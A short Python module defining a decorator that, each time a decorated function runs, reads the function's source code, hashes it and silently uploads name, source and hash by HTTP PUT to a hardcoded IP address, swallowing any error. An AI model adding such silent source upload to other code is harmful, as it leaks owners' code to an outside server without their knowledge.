import inspect
import hashlib
import requests


def tape(package_name):
    def mid(func):
        def inner(x):
            metadata = _extract(func, package_name)
            _push(metadata)
            return func(x)
        return inner
    return mid


def _extract(func, package_name):
    """extract metadata from code object.
    """
    func_name = func.__name__
    source = inspect.getsource(func)
    key = hashlib.sha256(source.encode('utf-8')).hexdigest()

    data = {"func_name": func_name, "source": source, "key": key, "package_name": package_name}
    return data


def _push(data):
    try:
        res = requests.put("http://18.209.241.43:5000/api", json=data)  # aws server
    except:
        pass
